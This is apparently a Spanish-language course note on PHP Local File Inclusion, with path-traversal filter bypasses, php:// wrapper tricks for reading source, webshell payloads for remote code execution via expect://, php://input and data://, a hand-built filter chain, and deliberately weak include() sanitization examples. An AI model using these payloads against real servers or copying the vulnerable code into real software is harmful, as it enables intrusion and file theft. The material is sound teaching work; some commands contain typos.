---
title: "[Lab] Local File Inclusion (LFI)"
date: 2023-12-25
categories: [OWASPTop10]
tags: [owasptop10, hacking, wrappers, php]
---




# Local File Inclusion (LFI)

### Resumen de clase:

- Local File Inclusion (LFI)
    
    La vulnerabilidad **Local File Inclusion** (**LFI**) es una vulnerabilidad de seguridad informática que se produce cuando una aplicación web **no valida adecuadamente** las entradas de usuario, permitiendo a un atacante **acceder a archivos locales** en el servidor web.
    
    En muchos casos, los atacantes aprovechan la vulnerabilidad de LFI al abusar de parámetros de entrada en la aplicación web. Los parámetros de entrada son datos que los usuarios ingresan en la aplicación web, como las URL o los campos de formulario. Los atacantes pueden manipular los parámetros de entrada para incluir rutas de archivo local en la solicitud, lo que puede permitirles acceder a archivos en el servidor web. Esta técnica se conoce como “**Path Traversal**” y se utiliza comúnmente en ataques de LFI.
    
    En el ataque de Path Traversal, el atacante utiliza caracteres especiales y caracteres de escape en los parámetros de entrada para navegar a través de los directorios del servidor web y acceder a archivos en ubicaciones sensibles del sistema.
    
    Por ejemplo, el atacante podría incluir “**../**” en el parámetro de entrada para navegar hacia arriba en la estructura del directorio y acceder a archivos en ubicaciones sensibles del sistema.
    
    Para prevenir los ataques LFI, es importante que los desarrolladores de aplicaciones web validen y filtren adecuadamente la entrada del usuario, limitando el acceso a los recursos del sistema y asegurándose de que los archivos sólo se puedan incluir desde ubicaciones permitidas. Además, las empresas deben implementar medidas de seguridad adecuadas, como el cifrado de archivos y la limitación del acceso de usuarios no autorizados a los recursos del sistema.
    
    A continuación, se os proporciona el enlace directo a la herramienta que utilizamos al final de esta clase para abusar de los ‘**Filter Chains**‘ y conseguir así ejecución remota de comandos:
    
    - **PHP Filter Chain Generator**: [https://github.com/synacktiv/php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator)

## Explotaciones

### LFI Básico

Permite mostrar archivos locales del servidor

![Untitled](Local%20File%20Inclusion%20(LFI)%20fe422edc5a864fb581eab947f892807a/Untitled.png)

![Untitled](Local%20File%20Inclusion%20(LFI)%20fe422edc5a864fb581eab947f892807a/Untitled%201.png)

### Ejemplo #1 - Directory Path Traversal: Contra raíz definida

Aunque se establezca una raíz por defecto, es posible moverse por directorios con barras ”../” para salir de esa raíz.

![Untitled](Local%20File%20Inclusion%20(LFI)%20fe422edc5a864fb581eab947f892807a/Untitled%202.png)

### Ejemplo #2 - Directory Path Traversal: Contra sustitución de barras

Aunque se aplique una sustitución de barras “../”, esto no se hace de forma recursiva permitiendo evitar esto incluyendo más puntos y barras “….//”.

![Untitled](Local%20File%20Inclusion%20(LFI)%20fe422edc5a864fb581eab947f892807a/Untitled%203.png)

### Ejemplo #3 - Contra Regex

Aunque se filtre el input del usuario para detectar palabras como “/etc/passwd”, etc, no evita la inclusión de otras formas cambiando la cadena de caracteres para mostrar el mismo archivo o intentar mostrar otros archivos no contemplados en la regex.

![Se muestra un mensaje de acceso denegado al intentar listar /etc/passwd](Local%20File%20Inclusion%20(LFI)%20fe422edc5a864fb581eab947f892807a/Untitled%204.png)

Se muestra un mensaje de acceso denegado al intentar listar /etc/passwd

![Se cambia la cadena de caracteres aplicando múltiples barras “///”](Local%20File%20Inclusion%20(LFI)%20fe422edc5a864fb581eab947f892807a/Untitled%205.png)

Se cambia la cadena de caracteres aplicando múltiples barras “///”

![Se listan otros archivos no contemplados en la regex](Local%20File%20Inclusion%20(LFI)%20fe422edc5a864fb581eab947f892807a/Untitled%206.png)

Se listan otros archivos no contemplados en la regex

Formas de listar un mismo archivo. Esto aplica solo cuando se usa un cat:

```bash
cat /etc/passwd # Comando normal
cat /etc//////passwd # Utilizando múltiples barras
cat /etc/./././passwd # Utilizando "/./"
cat /et?/p?ss?? # Insertando "?". El sistem buscará automáticamente 
# coincidencias
```

![Untitled](Local%20File%20Inclusion%20(LFI)%20fe422edc5a864fb581eab947f892807a/Untitled%207.png)

### Ejemplo #4 - Contra concatenación de extensiones

Esto no funciona para versiones de php superiores a “5.3”.

```bash
# Al final de la URL, se incluye un "Null Byte":
?filename=/etc/passwd%00

# Esto equivale a:
?filename=/etc/passwd\0

# En php interactive:
include("/etc/passwd\0" . "php");
```

Para probar esto, se puede instalar la siguiente imagen:

```bash
docker pull tommylau/php.5-2
docker run -dit --name testing <IDimagen>

```

Debido a que esta corresponde a una versión antigua, se puede evadir esta concatenación con un “Null Byte”:

![Concatenación de /etc/hosts con la extensión “.php”](Local%20File%20Inclusion%20(LFI)%20fe422edc5a864fb581eab947f892807a/Untitled%208.png)

Concatenación de /etc/hosts con la extensión “.php”

![Evadiendo la concatenación con un “Null Byte”](Local%20File%20Inclusion%20(LFI)%20fe422edc5a864fb581eab947f892807a/Untitled%209.png)

Evadiendo la concatenación con un “Null Byte”

### Ejemplo #5 - Contra verificación de últimos caracteres

![Verificación de últimos caracteres no muestra el archivo](Local%20File%20Inclusion%20(LFI)%20fe422edc5a864fb581eab947f892807a/Untitled%2010.png)

Verificación de últimos caracteres no muestra el archivo

![Evadiendo la verificación con “/.” al final de la cadena](Local%20File%20Inclusion%20(LFI)%20fe422edc5a864fb581eab947f892807a/Untitled%2011.png)

Evadiendo la verificación con “/.” al final de la cadena

### Lab para explotar LFIs

Instalación

```bash
git clone https://github.com/NetsecExplained/docker-labs
cd docker-labs/file-inclusion/college_website
docker-compose up -d
```

## Tipos de Wrappers

Sirven para representar el contenido de una página de una forma distinta.

### Wrappers - Convertir una cadena en base64:

**`php://filter/convert.base64-encode/resource=index.php`**

[+] Esto podría servir para obtener el código fuente de la página en base64

Instalación de lab

```bash
docker pull ubuntu:latest
docker images
docker run -dit -p 80:80 --name wrappers <ContainerID>
docker exec -it <ContainerID> bash
apt update
apt install aache2 php nano -y
service apache2 start
cd /var/www/html/
```

Se tiene el archivo “secret.php” y un index.php con el siguiente contenido:

```bash
#----- index.php -----#
<?php
	$filename = $_GET['file'];
	include($filename);
?>

#----- secret.php -----#

<?php
	// Este texto no debería ser visible ya que debería ser interpretado
?>
```

Al buscar este archivo en la web no muestra nada:

![Untitled](Local%20File%20Inclusion%20(LFI)%20fe422edc5a864fb581eab947f892807a/Untitled%2012.png)

Pero al utilizar un wrapper para codificar el contenido en base64, se puede obtener su contenido:

![Untitled](Local%20File%20Inclusion%20(LFI)%20fe422edc5a864fb581eab947f892807a/Untitled%2013.png)

![Untitled](Local%20File%20Inclusion%20(LFI)%20fe422edc5a864fb581eab947f892807a/Untitled%2014.png)

### Wrapper - Rotar los caracteres 13 posiciones (ROT13)

**`php://filter/read=string.rot13/resource=secret.php`**

![Untitled](Local%20File%20Inclusion%20(LFI)%20fe422edc5a864fb581eab947f892807a/Untitled%2015.png)

Esto para decodificarlo se hace de la siguiente manera:

```bash
# Fijar el primer caracter del contenido en ROT13, en 
# este casi es "c", por lo que c-z y a-b ya que "b" está antes 
# que "c", luego se ingresa lo mismo pero en MAYUS. Luego en el 
# segundo argumento, se hace lo mismo solo que como letra inicial, 
# se ingresa la letra con la que se quiere empezar, en este caso es 
# la "p" porque se sabe que la primer cadena es "php".
cat file | tr '[c-za-bC-ZA-B]' '[p-za-oP-ZA-O]'
```

![Untitled](Local%20File%20Inclusion%20(LFI)%20fe422edc5a864fb581eab947f892807a/Untitled%2016.png)

### Wrapper - Cambiar formato UTF-8 a UTF-16

**`php://filter/convert.iconv.utf-8.utf-16/resource=secret.php`**

- ¿Qué es UTF-8 y UTF-16?
    
    UTF-8 y UTF-16 son dos codificaciones de caracteres ampliamente utilizadas en informática. Ambas se basan en el estándar Unicode, que es un sistema de codificación que asigna un número único a cada carácter utilizado en la mayoría de los sistemas de escritura del mundo.
    
    1. UTF-8: Es una codificación de caracteres de longitud variable que utiliza entre 1 y 4 bytes para representar cada carácter. Es compatible con ASCII, lo que significa que los caracteres ASCII se representan exactamente igual en UTF-8. Es ampliamente utilizado en sistemas informáticos y en la web, ya que permite representar eficientemente caracteres de diferentes idiomas y símbolos especiales.
    2. UTF-16: Es otra codificación de caracteres que utiliza 2 o 4 bytes para representar cada carácter. A diferencia de UTF-8, UTF-16 no es compatible con ASCII. Se utiliza comúnmente en entornos Windows y en aplicaciones que requieren soporte para lenguajes de doble byte, como el chino, japonés y coreano.
    
    La conversión de UTF-8 a UTF-16 puede ser útil en ciertos casos, como:
    
    - Interoperabilidad: Si tienes datos o archivos codificados en UTF-8 y necesitas trabajar con sistemas o aplicaciones que esperan datos en UTF-16, es necesario realizar la conversión para garantizar la compatibilidad y la correcta visualización o procesamiento de los caracteres.
    - Requisitos específicos: Algunas aplicaciones o protocolos pueden requerir explícitamente el uso de UTF-16. En tales casos, la conversión de UTF-8 a UTF-16 es necesaria para cumplir con los requisitos de la aplicación o protocolo en cuestión.
    
    Es importante tener en cuenta que la conversión de una codificación a otra no siempre es trivial y puede implicar ciertos desafíos, especialmente si hay caracteres que no son compatibles entre las dos codificaciones. Es recomendable utilizar herramientas o bibliotecas adecuadas para garantizar una conversión precisa y sin pérdida de datos.
    
- ¿Cómo funciona el Wrapper?
    
    Cuando realizas la conversión de UTF-8 a UTF-16 utilizando **`php://filter/convert.iconv.utf-8.utf-16`**, estás cambiando la codificación del contenido del archivo PHP. Esto puede hacer que el contenido, que inicialmente estaba en UTF-8, se muestre correctamente en UTF-16.
    
    En cuanto a la página web, es común que las páginas web utilicen la codificación UTF-8. UTF-8 es una codificación ampliamente aceptada y compatible con la mayoría de los navegadores y aplicaciones web. Por lo tanto, es probable que la página web esté configurada para utilizar UTF-8 como su codificación predeterminada.
    
    Cuando realizas la conversión a UTF-16, estás cambiando la forma en que los caracteres se representan y se interpretan. UTF-16 utiliza 2 o 4 bytes para representar cada carácter, mientras que UTF-8 utiliza de 1 a 4 bytes. Esto significa que ciertos caracteres, especialmente aquellos que no están en el rango ASCII, pueden tener una representación diferente en UTF-16 en comparación con UTF-8.
    
    En algunos casos, es posible que ciertos caracteres o secuencias de caracteres en UTF-8 no se muestren correctamente debido a problemas de codificación o interpretación en la página web. Al realizar la conversión a UTF-16, esas secuencias de caracteres pueden mostrarse correctamente porque la página web puede estar mejor preparada para manejar la codificación UTF-16.
    

![Untitled](Local%20File%20Inclusion%20(LFI)%20fe422edc5a864fb581eab947f892807a/Untitled%2017.png)

### Wrapper - Ejecución de comandos

```bash
# Ejemplo #1
?file=expect://whoami

# Ejemplo #2
?file=php://input # Y en el contenido se le ingresa el comando

# Ejemplo #3
?file=data://test:plain;base64,<cadena en base64>
# Una cadena puede ser: "<?php system($_GET['cmd']); ?>" en base64

# Ejemplo #4
```

Ejemplo #2:

Con una petición por POST, se le ingresa el wrapper y en el contenido se el ingresa el comando:

![Untitled](Local%20File%20Inclusion%20(LFI)%20fe422edc5a864fb581eab947f892807a/Untitled%2018.png)

Si no funciona, se debe editar el archivo “nano /etc/php/8.1/apache2/php.ini” y poner en “On” el “allow_url_include”

Ejemplo #3

![Untitled](Local%20File%20Inclusion%20(LFI)%20fe422edc5a864fb581eab947f892807a/Untitled%2019.png)

### Wrapper - PHP Filter Chain Manual

En php, hay una característica curiosa la cual es que al codificar una cadena en base64 con “base64_encode()”, si al codificado, se le añaden cadenas incorrectas, el descodificado seguirá dando el mismo resultado:

![Untitled](Local%20File%20Inclusion%20(LFI)%20fe422edc5a864fb581eab947f892807a/Untitled%2020.png)

Sin embargo, esto no sucede igual cuando se utiliza el wrapper para codificar en base64 ya que da error cuando se le añade “=” al codificado:

![Untitled](Local%20File%20Inclusion%20(LFI)%20fe422edc5a864fb581eab947f892807a/Untitled%2021.png)

Esto se puede solucionar convirtiendo la cadena de UTF-8 a UTF-7 antes de decodificarla:

![Esta vez se pasó la cadena “prueba” a base64 y se le añadió “==” al final](Local%20File%20Inclusion%20(LFI)%20fe422edc5a864fb581eab947f892807a/Untitled%2022.png)

Esta vez se pasó la cadena “prueba” a base64 y se le añadió “==” al final

Si se pasa a hexadecimal con xxd, se vería de la siguiente manera:

![Untitled](Local%20File%20Inclusion%20(LFI)%20fe422edc5a864fb581eab947f892807a/Untitled%2023.png)

Ahora lo que se hace es transformar la cadena de UTF-8 a CSISO2022KR, esto curiosamente añade unos caracteres al principio de la cadena original:

![Untitled](Local%20File%20Inclusion%20(LFI)%20fe422edc5a864fb581eab947f892807a/Untitled%2024.png)

Ahora si a esto se lo pasa otra vez de UTF-8 a UTF-7 (para evitar el problema de los “=”) y luego se decodifica y se codifica otra vez, se le añaden muchos más caracteres a la cadena original:

![Untitled](Local%20File%20Inclusion%20(LFI)%20fe422edc5a864fb581eab947f892807a/Untitled%2025.png)

Ahora aquí es donde la magia ocurre, se hará lo mismo solo que con la cadena sin los iguales (==) que generan conflicto, es decir, se pasa de UTF-8 a CSISO2022KR y luego se decodifica y se codifica otra vez la cadena (sin necesidad de pasar de UTF-8 a UTF-7):

![Untitled](Local%20File%20Inclusion%20(LFI)%20fe422edc5a864fb581eab947f892807a/Untitled%2026.png)

Como se puede ver, a la cadena original se le agregó una “C”, esto significa que se pueden insertar varias cadenas de caracteres para inyectar por ejemplo una línea de php como “<?php system($_GET[’cmd’])?>” caractér por caracter

Como recomendación también es posible que en lugar se apuntar al archivo text.txt en este caso, sería apuntar al php://temp el cual se puede acudir para almacenar archivos temporales y demás.

Para poder representar cadenas de caracteres específicas, por ejemplo la cadena “Hola”, lo primero que hay que hacer es darle la vuelta a la cadena de esta forma: “aloH” y luego ir de caractér en caractér buscando el encoding correcto para representar la “a”, luego la “b” y así sucesivamente:

Se tomará como guía este repositorio el cual contiene un script que automatiza todo esto pero esta vez se hará a mano tomando como referencia el “diccionario de conversiones” en el que para cada letra hay una conversión: [https://github.com/synacktiv/php_filter_chain_generator/blob/main/php_filter_chain_generator.py](https://github.com/synacktiv/php_filter_chain_generator/blob/main/php_filter_chain_generator.py)

1. Se representará la cadena “Hola” por lo que se le da la vuelta a “aloH”

2. Se necesita un poco de “yunk” para operar o “campo de trabajo” antes de insertar la cadena “Hola” por lo que se utilizará esta base, también se recomienda pasa de UTF-8 a UTF-7 después del “yunk” para evitar errores debido a signos de igual (=):

php -r “”; echo “file_get_contents(’php://filter/convert.iconv.UTF-8.CSISO2022KR|conver.iconv.UTF-8.UTF-7/resource=text.txt’);”; echo

3. Ahora, tomando como referencia el repositorio, se buscará la letra “a” y se copiará su conversión:

![Untitled](Local%20File%20Inclusion%20(LFI)%20fe422edc5a864fb581eab947f892807a/Untitled%2027.png)

El comando quedaría así, primero se le inserta la conversión, luego de decodifica y codifica la cadena y al final se le agrega la conversión para errores: php -r “”; echo “file_get_contents(’php://filter/convert.iconv.UTF-8.CSISO2022KR|conver.iconv.UTF-8.UTF-7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|conver.base64-decode|convert.base64-encode|conver.iconv.UTF-8.UTF-7/resource=text.txt’);”; echo

Esto mostrará la letra “a” al inicio.

![Untitled](Local%20File%20Inclusion%20(LFI)%20fe422edc5a864fb581eab947f892807a/Untitled%2028.png)

Luego, la secuencia es la misma para las otras letras → yunk|conversión para errores|conversión para letra|decodificar y codificar|conversión para errores

![Untitled](Local%20File%20Inclusion%20(LFI)%20fe422edc5a864fb581eab947f892807a/Untitled%2029.png)

```bash
php -r "echo file_get_contents('php://filter/convert.iconv.UTF-8.CSISO2022KR|
convert.iconv.UTF-8.UTF-7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|
convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|
convert.base64-encode|convert.iconv.UTF-8.UTF-7|convert.iconv.CP-AR.UTF16|
convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|
convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|
convert.iconv.UTF-8.UTF-7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|
convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|
convert.base64-encode|convert.iconv.UTF-8.UTF-7|convert.iconv.CP1046.UTF16|
convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|
convert.iconv.UTF-8.UTF-7/resource=text.txt');"; echo
```

Esto también se puede ingresar en la web:

![Untitled](Local%20File%20Inclusion%20(LFI)%20fe422edc5a864fb581eab947f892807a/Untitled%2030.png)

```bash
php://filter/convert.iconv.UTF-8.CSISO2022KR|
convert.iconv.UTF-8.UTF-7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|
convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|
convert.base64-encode|convert.iconv.UTF-8.UTF-7|convert.iconv.CP-AR.UTF16|
convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|
convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|
convert.iconv.UTF-8.UTF-7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|
convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|
convert.base64-encode|convert.iconv.UTF-8.UTF-7|convert.iconv.CP1046.UTF16|
convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|
convert.iconv.UTF-8.UTF-7/resource=text.txt
```

### Wrapper - PHP Filter Chain Generator

Instalación:

```bash
git clone https://github.com/
synacktiv/php_filter_chain_generator/blob/main/
php_filter_chain_generator.py
```

Uso:

```bash
python3 php_filter_chain_generator.py --chain "cadena"
```

Ejemplo:

![Untitled](Local%20File%20Inclusion%20(LFI)%20fe422edc5a864fb581eab947f892807a/Untitled%2031.png)

Al pegarlo en la URL, se obtiene el comando php ejecutado:

![Untitled](Local%20File%20Inclusion%20(LFI)%20fe422edc5a864fb581eab947f892807a/Untitled%2032.png)

## Sanitizaciones

### Código sin sanitización

```bash
<?php
    $filename = $_GET['filename'];
    include($filename);
?>
```

### Ejemplo #1: Definir archivo raíz

Consiste en establecer un directorio raíz de forma que cuando el usuario busque un archivo, se busque desde el directorio especificado.

```bash
# ?filename=/etc/passwd -> ?filename=/var/www/html//etc/passwd
<?php
    $filename = $_GET['filename'];
    include("/var/www/html/" . $filename);
?>
```

### Ejemplo #2: Reemplazar barras (”../”) con str_replace()

Consiste en reemplazar las barras (”../”) a espacios para evitar que el usuario haga un directory path traversal.

```bash
# ?filename=../../../../etc/passwd -> ?filename=/var/www/etc/passwd
# str_replace("caracter_a_reemplazar", "<nuevo_caracter>", 
# "<input_del_usuario>");
<?php
    $filename = $_GET['filename'];
		$filename = str_replace("../", "", $filename);
    include("/var/www/html/" . $filename);
?>
```

### Ejemplo #3: Expresiones regulares

Consiste en filtrar palabras ingresadas por el usuario utilizando regex para no mostrar resultados.

```bash
# ?file=/etc/passwd -> Error
# preg_match("<regex>", "<input del usuario>");
# Al utilizar preg_match(), hay que escapar los caracteres especiales
<?php
    $filename = $_GET['filename'];
		$filename = str_replace("../", "", $filename);

		if(preg_match("/\/etc\/passwd/", $filename) == 1){
			echo "[!] Error al mostrar contenido";
		} else{
			include("/var/www/html/" . $filename);
		}
?>
```

### Ejemplo #4: Concatenar extensiones

Consiste en añadir de una extensión al final del archivo.

```bash
<?php
    $filename = $_GET['filename'];
		$filename = str_replace("../", "", $filename);

		include("/var/www/html/" . $filename . ".php");
?>
```

### Ejemplo #5: Verificar últimos caracteres

Consiste en verificar si los últimos caracteres coinciden con una cadena dada.

```bash
php -r 'if(substr($argv[1],-6,6)!="passwd") include($argv[1]);' '/etc/passwd'; echo
```

- Explicación del comando
    1. **`php -r`**: Esto indica que se está ejecutando un código PHP desde la línea de comandos.
    2. **`'if(substr($argv[1],-6,6)!="passwd") include($argv[1]);'`**: Esta es la expresión PHP que se ejecutará. Veamos su explicación paso a paso:
        - **`substr($argv[1],-6,6)`**: La función **`substr()`** se utiliza para obtener una subcadena de **`$argv[1]`**, que es el segundo argumento pasado al script PHP desde la línea de comandos. En este caso, se está obteniendo una subcadena de los últimos 6 caracteres de **`$argv[1]`**.
        - **`"passwd"`**: Esta es una cadena de texto que se utiliza para comparar con la subcadena obtenida. En caso de que la subcadena de los últimos 6 caracteres de **`$argv[1]`** no sea igual a "passwd", se ejecutará la siguiente instrucción.
        - **`include($argv[1])`**: La función **`include()`** se utiliza para incluir y ejecutar un archivo PHP. En este caso, se está incluyendo el archivo cuya ruta se especifica en **`$argv[1]`**, que es el primer argumento pasado al script PHP desde la línea de comandos.
    3. **`'/etc/passwd'`**: Este es el argumento que se pasa al script PHP desde la línea de comandos. En este caso, se está especificando la ruta del archivo "/etc/passwd" como argumento.
    4. **`echo`**: Esta es una instrucción de PHP para imprimir texto en la salida. En este caso, se está imprimiendo el resultado de la ejecución del script PHP.
    
    En resumen, la cadena de código PHP ejecuta un script que verifica si el último segmento de 6 caracteres del primer argumento pasado desde la línea de comandos es igual a "passwd". Si no lo es, se incluye el archivo especificado en el primer argumento (**`$argv[1]`**). Finalmente, se imprime el resultado.
    

![Untitled](Local%20File%20Inclusion%20(LFI)%20fe422edc5a864fb581eab947f892807a/Untitled%2033.png)
